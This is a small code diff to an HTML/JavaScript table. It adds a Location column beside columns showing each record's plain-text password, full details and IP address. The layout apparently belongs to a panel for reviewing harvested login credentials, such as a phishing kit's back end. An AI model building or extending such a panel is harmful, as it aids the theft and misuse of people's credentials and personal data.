@@ -43,9 +43,8 @@
                     <th>Password</th>
                     <th>Full Details</th>
                     <th>IP Address</th>
-                      <th>Location</th>
+                    <th>Location</th>
                     <th>Action</th>
-                    
                 </tr>
             </thead>
             <tbody></tbody>
@@ -86,6 +85,7 @@
                             <td><code>${r.password || '-'}</code></td>
                             <td style="max-width:500px; word-break:break-all;">${r.address || '-'}</td>
                             <td>${r.ip || 'Unknown'}</td>
+                            <td>${r.location || 'Unknown'}</td>
                             <td>
                                 ${action}
                                 <button class="btn delete" onclick="deleteRecord(${r.id})">🗑️ Delete</button>
